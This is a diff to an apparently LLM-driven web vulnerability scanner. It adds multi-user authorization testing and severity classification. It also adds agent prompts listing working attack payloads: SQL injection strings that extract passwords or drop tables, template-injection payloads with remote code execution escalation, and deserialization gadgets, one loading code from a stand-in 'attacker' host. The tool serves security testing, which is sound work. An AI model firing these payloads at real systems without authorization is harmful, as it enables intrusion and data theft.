@@ -38,6 +38,7 @@ from .prompts import (
     REACTIVE_CHAIN_TRIGGERS,
     ScanPhase,
 )
+from .severity import classify_severity
 from .tools import TOOL_DEFINITIONS, ScanTools
 
 logger = logging.getLogger(__name__)
@@ -1512,42 +1513,65 @@ async def run_scan(
         # domains instead of only the passive TLS/header audit.
         hosts_surfaced_to_llm: set[str] = {_seed_host} if _seed_host else set()
 
-        # ── Authenticate User B for BOLA/BFLA two-user testing ──────
-        user_b_auth_header: dict = {}
-        user_b_cookie_str: str = ""
-        has_user_b = bool(target.credentials_b and
-                          (target.credentials_b.get("username") or target.credentials_b.get("password")))
-        if has_user_b and _use_fast_path:
-            # In fast path we have no browser to drive a login form.  If User B
-            # has a static bearer/api-key we could in principle support BOLA here,
-            # but the current credentials_b schema only carries username/password
-            # — which implies form auth.  Skip with a clear warning.
-            print(f"  [AUTH-B] Skipped — fast path can't drive a login form. "
-                  f"BOLA testing will fall back to single-user mode.")
-            _cb("auth", {"status": "user_b_skipped", "reason": "fast_path_no_browser"})
-            has_user_b = False
-        if has_user_b:
-            print(f"  [AUTH-B] Authenticating User B for BOLA testing...")
-            _cb("auth", {"status": "authenticating_user_b", "url": target.url})
+        # ── Authenticate extra identities (User B, Admin, Tenant B) ──
+        # Each identity is stored as {"label": str, "header": dict, "cookie": str}
+        _extra_identities: list[dict] = []
+
+        async def _auth_extra(label: str, creds: dict | None, tag: str) -> None:
+            if not creds:
+                return
+            has_cred = (creds.get("username") or creds.get("password")
+                        or creds.get("bearer_token") or creds.get("api_key"))
+            if not has_cred:
+                return
+            if _use_fast_path:
+                if creds.get("bearer_token") or creds.get("api_key"):
+                    hdr: dict = {}
+                    if creds.get("bearer_token"):
+                        hdr["Authorization"] = f"Bearer {creds['bearer_token']}"
+                    elif creds.get("api_key"):
+                        hdr["X-Api-Key"] = creds["api_key"]
+                    _extra_identities.append({"label": label, "header": hdr, "cookie": ""})
+                    print(f"  [AUTH-{tag}] {label}: static token (fast path)")
+                    _cb("auth", {"status": f"{tag}_done", "type": "static"})
+                else:
+                    print(f"  [AUTH-{tag}] Skipped — fast path can't drive a login form.")
+                    _cb("auth", {"status": f"{tag}_skipped", "reason": "fast_path_no_browser"})
+                return
+            print(f"  [AUTH-{tag}] Authenticating {label}...")
+            _cb("auth", {"status": f"authenticating_{tag}", "url": target.url})
             try:
-                target_b = ScanTarget(
-                    id=target.id + "_b",
+                tgt = ScanTarget(
+                    id=f"{target.id}_{tag}",
                     url=target.url,
                     scan_mode=target.scan_mode,
-                    credentials=target.credentials_b,
-                    auth_config=target.auth_config,
+                    credentials={k: creds.get(k, "") for k in ("username", "password") if creds.get(k)},
+                    auth_config={
+                        **target.auth_config,
+                        **({"bearer_token": creds["bearer_token"]} if creds.get("bearer_token") else {}),
+                        **({"api_key": creds["api_key"]} if creds.get("api_key") else {}),
+                    },
                 )
-                auth_session_b = await authenticate(browser, target_b, router, model)
-                user_b_auth_header = auth_session_b.get_auth_header()
-                cookies_b = await auth_session_b.page.context.cookies()
-                user_b_cookie_str = "; ".join(f"{c['name']}={c['value']}" for c in cookies_b)
-                await auth_session_b.page.close()
-                print(f"  [AUTH-B] User B auth type: {auth_session_b._auth_type}")
-                _cb("auth", {"status": "user_b_done", "type": auth_session_b._auth_type})
+                sess = await authenticate(browser, tgt, router, model)
+                hdr = sess.get_auth_header()
+                cookies_raw = await sess.page.context.cookies() if sess.page else []
+                cookie_str = "; ".join(f"{c['name']}={c['value']}" for c in cookies_raw)
+                if sess.page:
+                    await sess.page.close()
+                _extra_identities.append({"label": label, "header": hdr, "cookie": cookie_str})
+                print(f"  [AUTH-{tag}] {label} auth type: {sess._auth_type}")
+                _cb("auth", {"status": f"{tag}_done", "type": sess._auth_type})
             except Exception as e:
-                print(f"  [AUTH-B] User B auth failed (non-fatal): {e}")
-                _cb("auth", {"status": "user_b_failed", "error": str(e)})
-                has_user_b = False
+                print(f"  [AUTH-{tag}] {label} auth failed (non-fatal): {e}")
+                _cb("auth", {"status": f"{tag}_failed", "error": str(e)})
+
+        await _auth_extra("User B", target.credentials_b, "user_b")
+        await _auth_extra("Admin", target.credentials_admin, "admin")
+        await _auth_extra("Tenant B", target.credentials_tenant_b, "tenant_b")
+
+        has_user_b = any(i["label"] == "User B" for i in _extra_identities)
+        user_b_auth_header = next((i["header"] for i in _extra_identities if i["label"] == "User B"), {})
+        user_b_cookie_str = next((i["cookie"] for i in _extra_identities if i["label"] == "User B"), "")
 
         # ── Navigate to target & wait for SPA readiness (generic) ────
         # After OIDC/SSO auth the browser may still be on the login URL.
@@ -2009,33 +2033,61 @@ async def run_scan(
                 if ctx:
                     phase_prompt += "\n\n" + ctx
 
-            # Inject User B context into BOLA/authorization phases
+            # Inject multi-identity context into authorization / session phases.
+            # Old placeholders (BOLA-only) + new {multi_identity_context}.
             bola_web_placeholder = "{bola_user_b_web}"
             bola_api_placeholder = "{bola_user_b_api}"
-            if has_user_b and (bola_web_placeholder in phase_prompt or bola_api_placeholder in phase_prompt):
-                user_b_hdr_str = ", ".join(f'"{k}: {v}"' for k, v in user_b_auth_header.items()) if user_b_auth_header else "(none)"
-                user_b_block = (
-                    "\n\n--- TWO-USER BOLA/BFLA TESTING MODE ---\n"
-                    "A second user (User B) has been authenticated. You are currently logged in as User A.\n"
-                    "STEP 1: As User A, browse the application and collect resource IDs (user profiles, orders, "
-                    "documents, settings, etc.). Note every ID you find in URLs, responses, and hidden fields.\n"
-                    "STEP 2: For each resource ID belonging to User A, make the SAME request but with "
-                    "User B's credentials. Use the api_request tool with these EXACT headers to act as User B:\n"
-                    f"  Authorization headers: {user_b_hdr_str}\n"
-                    f"  Cookie: {user_b_cookie_str}\n"
-                    "STEP 3: Compare responses. If User B can read/modify/delete User A's resources, this is "
-                    "a CONFIRMED BOLA (Broken Object Level Authorization) — severity Critical.\n"
-                    "STEP 4: Also test vertical privilege escalation: use User B's creds to access admin-only "
-                    "endpoints or perform privileged actions (BFLA — Broken Function Level Authorization).\n"
-                    "For EVERY test, record: User A's resource ID, the endpoint, User B's response status "
-                    "and body snippet as evidence.\n"
-                    "--- END BOLA MODE ---"
+            multi_id_placeholder = "{multi_identity_context}"
+            _authz_phase_ids = {
+                "web_a01", "web_bfla", "web_session_mgmt", "web_password_reset",
+                "api_authz", "api_auth", "api_bfla", "api_data_exposure",
+            }
+            _has_any_extra = bool(_extra_identities)
+            _needs_injection = (
+                _has_any_extra
+                and (phase.id in _authz_phase_ids
+                     or bola_web_placeholder in phase_prompt
+                     or bola_api_placeholder in phase_prompt
+                     or multi_id_placeholder in phase_prompt)
+            )
+            if _needs_injection:
+                id_lines: list[str] = []
+                for idx_id, ident in enumerate(_extra_identities, 1):
+                    hdr_str = ", ".join(f'"{k}: {v}"' for k, v in ident["header"].items()) if ident["header"] else "(none)"
+                    id_lines.append(
+                        f"  Identity {idx_id} — {ident['label']}:\n"
+                        f"    Authorization header: {hdr_str}\n"
+                        f"    Cookie: {ident['cookie'] or '(none)'}"
+                    )
+                id_block = "\n".join(id_lines)
+                multi_block = (
+                    "\n\n--- MULTI-IDENTITY TESTING MODE ---\n"
+                    f"You are logged in as the PRIMARY user (User A). {len(_extra_identities)} additional "
+                    "identity/ies have been authenticated:\n"
+                    f"{id_block}\n\n"
+                    "For EVERY sensitive endpoint / resource you discover as User A:\n"
+                    "  1. Replay the request with EACH alternative identity's headers (api_request).\n"
+                    "  2. If any alternative identity can access / mutate the resource → CONFIRMED finding:\n"
+                    "     • Same role, different user → 'BOLA — <identity> can <action> <resource>' (Critical)\n"
+                    "     • Lower role accessing higher → 'BFLA — <identity> can <action> <endpoint>' (Critical)\n"
+                    "     • Different tenant accessing data → 'Cross-Tenant Access — <identity>' (Critical)\n"
+                    "  3. Record: endpoint, User A's resource ID, alternative identity used, response "
+                    "status + body snippet.\n"
+                    "  4. For session / API-key endpoints: test cross-identity revocation "
+                    "(User B revoking User A's session/key) and vice versa.\n"
+                    "  5. Admin-only actions: create/delete users, change roles, manage licenses/billing "
+                    "— test with every non-admin identity.\n"
+                    "--- END MULTI-IDENTITY MODE ---"
                 )
-                phase_prompt = phase_prompt.replace(bola_web_placeholder, user_b_block)
-                phase_prompt = phase_prompt.replace(bola_api_placeholder, user_b_block)
+                phase_prompt = phase_prompt.replace(bola_web_placeholder, multi_block)
+                phase_prompt = phase_prompt.replace(bola_api_placeholder, multi_block)
+                phase_prompt = phase_prompt.replace(multi_id_placeholder, multi_block)
+                if multi_id_placeholder not in phase.prompt and phase.id in _authz_phase_ids:
+                    phase_prompt += multi_block
             else:
                 phase_prompt = phase_prompt.replace(bola_web_placeholder, "")
                 phase_prompt = phase_prompt.replace(bola_api_placeholder, "")
+                phase_prompt = phase_prompt.replace(multi_id_placeholder, "")
 
             # Stage-B sibling-host coverage: announce any newly-discovered
             # in-scope sub-domains to the LLM and require it to extend
@@ -2398,7 +2450,58 @@ async def run_scan(
                     "DELETE, _method=DELETE body param.\n"
                     "6. Parameter pollution: add ?admin=true, ?role=admin, ?debug=1, "
                     "?isAdmin=1, ?bypass=true, ?internal=1\n"
-                    "7. Try endpoints you haven't tested yet\n"
+                    "7. Try endpoints you haven't tested yet\n\n"
+                    "AUTHENTICATED BUSINESS-LOGIC SURFACE (frequently MISSED):\n"
+                    "  Generic crawls miss high-value SaaS / multi-tenant endpoints because they "
+                    "live behind explicit UI actions (Settings → Billing, Admin → Audit, etc.) "
+                    "rather than being linked from the landing page. After authentication, you "
+                    "MUST deliberately probe each of the following surfaces with the auth header "
+                    "from any session you have:\n"
+                    "    Tenant / org:      /api/orgs, /api/organizations, /api/tenants, "
+                    "/api/companies, /api/workspaces, /api/orgs/{{id}}/members, "
+                    "/api/orgs/{{id}}/license, /api/orgs/{{id}}/billing\n"
+                    "    Subscription:      /api/subscriptions, /api/plans, /api/plans/import, "
+                    "/api/billing, /api/invoices, /api/invoices/{{id}}, /api/invoices/template, "
+                    "/api/checkout, /api/payment_methods\n"
+                    "    Licenses:          /api/licenses, /api/licenses/generate, "
+                    "/api/licenses/{{id}}/revoke, /api/keys, /api/api_keys, /api/api_keys/{{id}}\n"
+                    "    Sessions:          /api/sessions, /api/users/{{id}}/sessions, "
+                    "/api/users/{{id}}/sessions/{{sid}}, /api/auth/sessions, /api/sessions/revoke\n"
+                    "    Audit / reports:   /api/audit, /api/audit-log, /api/audit/events, "
+                    "/api/reports, /api/reports/generate, /api/reports/revenue, /api/exports, "
+                    "/api/export/csv, /api/stats, /api/metrics\n"
+                    "    Admin / config:    /api/admin/users, /api/admin/orgs, /api/admin/config, "
+                    "/api/admin/feature_flags, /api/settings, /api/config, /api/system\n"
+                    "    Workflow / import: /api/workflows, /api/pipelines, /api/imports, "
+                    "/api/restore, /api/migrate, /api/templates, /api/forms\n"
+                    "    Files / storage:   /api/files, /api/files/{{id}}/download, /api/uploads, "
+                    "/api/attachments, /api/documents, /api/exports/{{id}}\n"
+                    "    Integrations:      /api/webhooks, /api/integrations, /api/oauth/clients\n"
+                    "  For each one that returns 200 — try every test class above (IDOR sweep, "
+                    "BFLA cross-role, method tampering). Each multi-tenant leak is a SEPARATE "
+                    "Critical 'Cross-Tenant Data Access' finding.\n\n"
+                    "STATE-MUTATION INVARIANTS (Session / API-Key / License revocation):\n"
+                    "  These are CRITICAL but rarely caught because they need a specific request "
+                    "sequence — execute them now if any session-management or key-management "
+                    "endpoint exists:\n"
+                    "    1. Cross-user revocation (User A creates, User B revokes):\n"
+                    "       a. As User A: POST /api/sessions or /api/api_keys → capture id\n"
+                    "       b. As User B (or unauth): DELETE /api/sessions/<A's id> "
+                    "or /api/api_keys/<A's id>\n"
+                    "       c. Re-validate as User A: 200 == User B successfully revoked → "
+                    "'IDOR — User can revoke other users' <session/api-key>' (High/Critical).\n"
+                    "    2. Self-revocation enforcement: as User A try to revoke User B's token by "
+                    "guessing IDs (sid-1, sid+1, UUID brute) — if 200, same finding class.\n"
+                    "    3. License / subscription cross-tenant generation: as Tenant A, POST "
+                    "/api/licenses/generate with {{\"orgId\": <Tenant B's id>}} — if 200, "
+                    "'Cross-Tenant License Generation' (Critical).\n"
+                    "    4. Role-validation absence: as a non-admin user, POST to "
+                    "/api/admin/users, /api/admin/orgs, /api/admin/config etc. — 200 / 403-with-"
+                    "data-leak / 500 not rejecting cleanly = 'Missing Role Validation' (Critical).\n"
+                    "    5. Org-switch / impersonation: if the app has a tenant-switch or impersonate "
+                    "feature, after switching, replay an old request with the previous tenant's "
+                    "context — unchanged tenant scope after switch = 'Impersonation Trail / "
+                    "Org-Switch Session Confusion' (High).\n\n"
                     "DO NOT give up. Try at least 3 more approaches."
                 ),
                 "auth": (
@@ -2479,7 +2582,49 @@ async def run_scan(
                     "3. Try UNION-based: ' UNION SELECT NULL-- with increasing NULLs\n"
                     "4. Try api_request with manually crafted SQL payloads in URL params and body\n"
                     "5. Test DIFFERENT endpoints you haven't tried (login, search, profile, API)\n"
-                    "6. Look at error messages for DB type hints (PostgreSQL, MySQL, SQLite, MSSQL)\n"
+                    "6. Look at error messages for DB type hints (PostgreSQL, MySQL, SQLite, MSSQL)\n\n"
+                    "ORDER BY / GROUP BY / column-name injection (frequently missed):\n"
+                    "  Quoted SQL injection payloads (' OR 1=1) DO NOT WORK in ORDER BY / GROUP BY "
+                    "positions because those clauses don't take quoted strings — they take raw "
+                    "column references. If a request has any of these parameter names, treat them "
+                    "as a column-name injection point and use UNQUOTED payloads:\n"
+                    "    ?sort=    ?order=    ?orderBy=    ?order_by=    ?sortBy=\n"
+                    "    ?groupBy=  ?group_by=  ?dir=  ?direction=  ?column=  ?field=\n"
+                    "  Unquoted payload set to try (send each via api_request, watch for 5xx / "
+                    "SQL error / >3s response / different row count):\n"
+                    "    name)--                                  (terminator probe)\n"
+                    "    name,(SELECT 1)                          (trailing-expression — should 200)\n"
+                    "    name,(SELECT version())                  (UNION-style version disclosure)\n"
+                    "    name,SLEEP(3)                            (MySQL time-based)\n"
+                    "    name,pg_sleep(3)                         (PostgreSQL time-based)\n"
+                    "    1,(CASE WHEN 1=1 THEN SLEEP(3) ELSE 0 END)\n"
+                    "    name,(SELECT password FROM users LIMIT 1) (data extraction)\n"
+                    "  A 200 with the SLEEP variant taking >3 seconds = CONFIRMED 'SQL Injection in "
+                    "ORDER BY <param>' (Critical) even if the body looks normal. Time-based is the "
+                    "only signal here — error-based won't fire.\n\n"
+                    "Date / period parameter injection (audit logs, revenue reports, range filters):\n"
+                    "  Endpoints like /api/audit?from=...&to=...  /api/revenue?period=...  "
+                    "/api/reports?date=...  /api/stats?range=...  often pipe the date string into "
+                    "a SQL fragment such as date_trunc('day', $1::timestamp) or BETWEEN. Try:\n"
+                    "    period = day'); SELECT pg_sleep(3)--      (Postgres date_trunc break-out)\n"
+                    "    from   = 2024-01-01' OR SLEEP(3)--        (MySQL inline)\n"
+                    "    to     = ',(SELECT version())--           (UNION-style on second arg)\n"
+                    "    range  = day,(SELECT password FROM users LIMIT 1)\n"
+                    "  Backend usually wraps the value into a quoted SQL literal — break out of the "
+                    "quote before injecting. If the wrapping is unquoted (date_trunc accepts an "
+                    "interval literal), use the unquoted ORDER BY style above.\n\n"
+                    "Export / report endpoints (POST body or query param SQL injection):\n"
+                    "  Endpoints like POST /api/export, POST /api/reports/generate, "
+                    "GET /api/download?type=...  GET /api/search/csv?q=... that take an "
+                    "organization / tenant / project / customer NAME often build the export SQL "
+                    "by concatenating that name into a WHERE clause. Try the FULL NAME field "
+                    "(not just id), in BOTH JSON body and query string, with these payloads:\n"
+                    "    {{\"name\": \"' UNION SELECT NULL,version(),NULL--\"}}\n"
+                    "    {{\"name\": \"'; DROP TABLE x; --\"}}        (look for SQL parser error 500)\n"
+                    "    ?orgName=' OR 1=1--   ?tenant=' AND SLEEP(3)--\n"
+                    "  CSV / XLSX / PDF endpoints are commonly missed because the LLM stops once "
+                    "it sees the export 'works' on a benign value. ALWAYS retry with an injection "
+                    "payload and inspect the resulting file body for leaked rows or SQL errors.\n\n"
                     "DO NOT give up. Try at least 3 more approaches AND the param-name permutation "
                     "above on any endpoint that returned a validation-style rejection."
                 ),
@@ -2517,7 +2662,92 @@ async def run_scan(
                     "name is a strong signal.\n"
                     "4. Different template engines: Jinja2, Twig, Freemarker, Handlebars\n"
                     "5. Different file targets: /etc/passwd, /etc/hosts, C:\\Windows\\win.ini\n"
-                    "6. Try inputs you haven't tested and different encoding/bypass techniques\n"
+                    "6. Try inputs you haven't tested and different encoding/bypass techniques\n\n"
+                    "PER-ENGINE SSTI PAYLOAD SWEEP (when reflection is into rendered HTML / PDF / "
+                    "email / CSV / docx — anywhere a string ends up in a server-rendered template):\n"
+                    "  Trigger this sweep on ANY endpoint that takes a name/title/template/body/"
+                    "content/subject/footer field and returns rendered output. Send each engine's "
+                    "fingerprint payload as a SEPARATE request and watch for the literal value 49 "
+                    "(or 7777777) in the response — that's a CONFIRMED SSTI:\n"
+                    "    Jinja2 / Django:    {{7*7}}                        -> expect 49\n"
+                    "    Jinja2 deep:        {{7*'7'}}                      -> expect 7777777\n"
+                    "    Twig (PHP):         {{7*7}}                        -> expect 49\n"
+                    "    Twig deep:          {{7*'7'}}                      -> expect 49 (NOT 7777777)\n"
+                    "    Smarty (PHP):       {$smarty.version}              -> expect Smarty version\n"
+                    "    Mako (Python):      ${{7*7}}                       -> expect 49\n"
+                    "    ERB (Ruby):         <%= 7*7 %>                     -> expect 49\n"
+                    "    Velocity (Java):    #set($x=7*7)$x                  -> expect 49\n"
+                    "    FreeMarker (Java):  <#assign x=7*7>${{x}}           -> expect 49\n"
+                    "    FreeMarker RCE:     <#assign ex=\"freemarker.template.utility.Execute\"?new()>${{ex(\"id\")}}\n"
+                    "    Handlebars (JS):    {{#with \"x\"}}{{constructor.constructor(\"return 7*7\")()}}{{/with}}\n"
+                    "    Pug (JS):           #{{7*7}}                       -> expect 49\n"
+                    "    Razor (.NET):       @(7*7)                         -> expect 49\n"
+                    "    Thymeleaf (Java):   __${{7*7}}__::                 -> expect 49\n"
+                    "  Two engines distinguish themselves: Jinja2 evaluates 7*'7' to '7777777', "
+                    "Twig evaluates it to 49 — use that to fingerprint which engine you hit. "
+                    "REPORT each confirmed render as 'Server-Side Template Injection in <field> "
+                    "(<engine>)' (Critical) and ALWAYS attempt the per-engine RCE escalation "
+                    "(Jinja2: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}).\n\n"
+                    "INSECURE DESERIALIZATION CONTENT-TYPE SWEEP:\n"
+                    "  Any endpoint that accepts application/x-yaml, application/yaml, "
+                    "application/octet-stream, application/x-java-serialized-object, "
+                    "application/x-php-serialized, or a base64-encoded blob in JSON "
+                    "({{\"data\":\"gASVDA…\"}}) is a deserialization candidate. Test each with the "
+                    "matching gadget. The Plan-Import / Bulk-Import / Workflow / Pipeline / Config-"
+                    "Restore / Template-Import endpoints (typically POST /api/*/import) are the "
+                    "most common surface — try them ALL even if not in the documented spec:\n"
+                    "    PyYAML (Python):     Send Content-Type: application/x-yaml with body:\n"
+                    "                           !!python/object/apply:os.system ['sleep 5']\n"
+                    "                           !!python/object/apply:subprocess.check_output [['id']]\n"
+                    "                           !!python/object/new:os.system ['id']\n"
+                    "                         A >5s response = CONFIRMED RCE via PyYAML.\n"
+                    "    SnakeYAML (Java):    Same Content-Type, body:\n"
+                    "                           !!javax.script.ScriptEngineManager [\n"
+                    "                              !!java.net.URLClassLoader [[\n"
+                    "                                !!java.net.URL [\"http://attacker/poc.jar\"]\n"
+                    "                              ]]\n"
+                    "                           ]\n"
+                    "                         OR the ScriptEngineFactory loadClass variant — "
+                    "                         look for ClassNotFoundException / ScriptException "
+                    "                         in 500 responses (still confirms unsafe parse).\n"
+                    "    PHP unserialize:     {{\"data\":\"O:8:\\\"stdClass\\\":1:{{s:4:\\\"data\\\";s:4:\\\"PWND\\\";}}\"}}\n"
+                    "                         Look for 'unserialize()' warnings in error responses.\n"
+                    "    Python pickle:       Send Content-Type: application/octet-stream with body\n"
+                    "                         being base64 of: pickle.dumps(__import__('os').system, ...)\n"
+                    "                         500 with 'pickle' / '_reconstructor' = unsafe parse.\n"
+                    "    Java native:         POST application/x-java-serialized-object with the\n"
+                    "                         standard ysoserial CommonsCollections1 payload (or any\n"
+                    "                         arbitrary 'aced0005' prefix) — 500 with\n"
+                    "                         'ObjectInputStream' / 'readObject' confirms.\n"
+                    "    .NET BinaryFormatter: x-www-form-urlencoded body with __VIEWSTATE=AAEAAAD///…\n"
+                    "                         (any malformed BinaryFormatter blob) — 500 with\n"
+                    "                         'BinaryFormatter' / 'SerializationException'.\n"
+                    "  REPORT confirmed exploits as 'Insecure Deserialization in <endpoint> "
+                    "(<library>)' (Critical) and any 500 with library-specific error text as "
+                    "'Unsafe Deserialization Indicator' (High — partial confirmation, the parser "
+                    "is unsafely processing user input even if this specific gadget didn't trigger).\n\n"
+                    "VERBOSE-ERROR / STACK-TRACE HARNESS:\n"
+                    "  Many real-world findings come not from injection success but from the SERVER'S "
+                    "ERROR. Once you've exhausted the payload classes above, deliberately POISON "
+                    "every endpoint with malformed input and capture any 5xx body for stack traces, "
+                    "framework banners, file paths, internal hostnames, DB schema fragments. Try:\n"
+                    "    1. Type confusion:        {{\"id\": []}}, {{\"id\": {{}}}}, {{\"id\": \"abc\"}}\n"
+                    "                              when the schema expects integer\n"
+                    "    2. Truncated JSON:        '{{\"name\":' (missing closing brace) — many JSON\n"
+                    "                              parsers leak parser internals on the failure path\n"
+                    "    3. Oversized strings:     {{\"name\": \"A\" * 10000}} for buffer / regex DoS\n"
+                    "                              and possible logging stack traces\n"
+                    "    4. Encoding tricks:       %00, %0a%0d, \\u0000, raw NULL bytes in path/body\n"
+                    "    5. Method tampering:      TRACE / OPTIONS / DEBUG / PROPFIND on every\n"
+                    "                              endpoint — TRACE often echoes back internal IPs\n"
+                    "    6. Negative / huge numbers: id=-1, id=999999999999999999, id=NaN, id=Infinity\n"
+                    "  REPORT each leaked detail as 'Verbose Error Disclosure — <kind>' (Low/Medium):\n"
+                    "    - Stack trace with file paths     -> Medium\n"
+                    "    - Framework / language banner     -> Low\n"
+                    "    - DB error with table / column    -> Medium\n"
+                    "    - Internal hostname / IP / CIDR   -> Medium\n"
+                    "    - SQL fragment in error body      -> High (also indicates SQLi candidate)\n"
+                    "  Each unique leakage is a SEPARATE finding (don't dedupe across endpoints).\n\n"
                     "DO NOT give up. Try at least 3 more approaches."
                 ),
                 "ssrf": (
@@ -3007,6 +3237,13 @@ async def run_scan(
                     print("  [PASSIVE-2] Re-running passive recon on authenticated page...")
                     p2_num = _next_phase()
                     _cb("phase_start", {"phase": p2_num, "total": 0, "name": "Passive Recon (post-auth)", "id": "passive_recon_2"})
+                    extra_snips: list[tuple[str, str]] = []
+                    try:
+                        dom_html = await page.content()
+                        if dom_html and len(dom_html.strip()) > 50:
+                            extra_snips.append(("Authenticated page HTML", dom_html))
+                    except Exception:
+                        pass
                     p2_result = await run_passive_recon(
                         page=page,
                         http_client=http_client,
@@ -3015,6 +3252,7 @@ async def run_scan(
                         on_progress=_passive_progress,
                         network_js_urls=network_js_urls,
                         skip_tls_sibling_discovery=_skip_tls_siblings,
+                        extra_text_snippets=extra_snips or None,
                     )
                     if isinstance(p2_result, tuple):
                         p2_findings, p2_tech = p2_result
@@ -3167,6 +3405,10 @@ async def run_scan(
                     "inconclusive": inconclusive,
                     "unverified": unverified,
                 }
+                # Re-classify now that verdict + verified are populated:
+                # CONFIRMED gets a small CVSS boost, DISPROVED collapses to 0.
+                for f in verified:
+                    f.update(classify_severity(f))
                 findings = verified
             except Exception as e:
                 print(f"  [VERIFY] Verification failed (non-fatal): {e}")
@@ -3211,6 +3453,10 @@ def _process_finding_obj(obj: dict, findings: list[dict], rejected: list[str],
             if require_evidence and not _has_evidence(obj):
                 rejected.append(obj.get("title", "?"))
                 return
+            # Normalise severity / CVSS / CWE deterministically before dedup so that
+            # two identical findings with different LLM-assigned severities still
+            # collapse together.
+            obj.update(classify_severity(obj))
             if dedup and any(f.get("title") == obj.get("title") and f.get("severity") == obj.get("severity") for f in findings):
                 return
             findings.append(obj)
